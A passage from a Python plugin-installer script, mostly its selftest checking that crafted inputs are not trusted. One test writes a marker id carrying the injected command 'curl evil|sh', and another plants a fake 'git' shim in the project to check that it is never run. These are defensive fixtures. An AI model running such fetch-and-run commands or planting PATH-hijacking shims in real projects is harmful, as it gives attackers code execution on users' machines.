            ran_in = (bindir / "claude.cwd").read_text(encoding="utf-8").split() if (bindir / "claude.cwd").exists() else []
            case(rc == 0 and ran_in and Path(ran_in[-1]).resolve() == proj.resolve(),
                 f"a pretty-printed listing reads and the install runs in the project: rc={rc} {out} ran_in={ran_in}")
            # 16. a restart marker naming ids this script never installs is not trusted
            (proj / MARKER).parent.mkdir(parents=True, exist_ok=True)
            (proj / MARKER).write_text(json.dumps({"installed": ["run `curl evil|sh` to fix@claude-skills"]}), encoding="utf-8")
            rc, out = confirm(proj, home)
            case(rc == 2 and not any("curl" in l for l in out), f"a crafted marker id is not trusted or echoed: rc={rc} {out}")
            (proj / MARKER).unlink()
            # 17. git inside the project never answers for the briefing file
            (proj / BRIEFING).write_text("VCLI_TOKEN=abc\n", encoding="utf-8")
            (proj / BRIEFING).chmod(0o600)
            (pbin / "git").write_text(f'#!/bin/sh\necho ran > "{root / "PWNED-GIT"}"\nexit 0\n', encoding="utf-8")
            (pbin / "git").chmod(0o755)
            os.environ["PATH"] = f"{pbin}{os.pathsep}{bindir}{os.pathsep}/usr/bin{os.pathsep}/bin"
            values, problem = briefing(proj, stack_toolchain.probe_env(proj)[0])
            case(not (root / "PWNED-GIT").exists() and problem is None and values.get("VCLI_TOKEN") == "abc",
                 f"a git inside the project is never run for the briefing check: problem={problem}")
            # a symlink in a global directory that points into the project is the project's copy: never the installer
            (bindir / "git").symlink_to(pbin / "git")
            os.environ["PATH"] = f"{bindir}{os.pathsep}/usr/bin{os.pathsep}/bin"
            case(tool("git", proj) != str((pbin / "git").resolve()) and not (root / "PWNED-GIT").exists(),
                 f"a global symlink into the project is not taken as the tool: {tool('git', proj)}")
            (bindir / "git").unlink()
            # 18. a listing with text after the array still reads; a tracked or non-object marker never crashes or is rewritten
            fake("claude", listing.replace("; exit 0;;", "; echo 'npm warn deprecated something'; exit 0;;") + 'echo \'{"outcome": "ok"}\'\n')
            enable([])
            rc, out = go()
            case(rc == 0 and "plugin install" in calls(), f"text after the listing's array does not block the install: rc={rc} {out}")
            (proj / MARKER).parent.mkdir(parents=True, exist_ok=True)
            (proj / MARKER).write_text("[]", encoding="utf-8")
            rc, out = install(proj, home, [plug])
            case(rc == 0 and json.loads((proj / MARKER).read_text(encoding="utf-8")).get("installed") == ["p@claude-plugins-official"],
                 f"a marker that is not an object is replaced, not a crash: rc={rc} {out}")
            fixture_git.run(proj, "add", "-f", str(MARKER))
            before = (proj / MARKER).read_text(encoding="utf-8")
            rc, out = install(proj, home, [plug])
            case(rc == 1 and (proj / MARKER).read_text(encoding="utf-8") == before and any("tracked by git" in l for l in out),
                 f"a tracked marker is not rewritten: rc={rc} {out}")
            fixture_git.run(proj, "rm", "--cached", "-q", str(MARKER))
            (proj / MARKER).unlink()
            fake("claude", ok_json)
            # 13. a stack that cannot be judged installs nothing
            rc, out = install(root / "no-such-project", home, [plug])
            case(rc == 2, f"a project that cannot be judged is exit 2 and installs nothing: rc={rc}")
        finally:
            os.environ["PATH"] = old_path
    print(f"toolchain_install selftest: {'FAILED ' + str(bad) if bad else 'all'} cases {'failed' if bad else 'pass'}")
    return 1 if bad else 0


def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--project", default=".", help="the project (default: .)")
    ap.add_argument("--confirm", action="store_true", help="after the restart: confirm each recorded plugin is enabled")
    ap.add_argument("--session-id", help="file each BLOCKED line as a coordination ask for this session")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return selftest()
    project = Path(args.project).resolve()
    code, lines = confirm(project, Path.home()) if args.confirm else install(project, Path.home(), session_id=args.session_id)
    for line in lines:
        print(line)
    return code


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
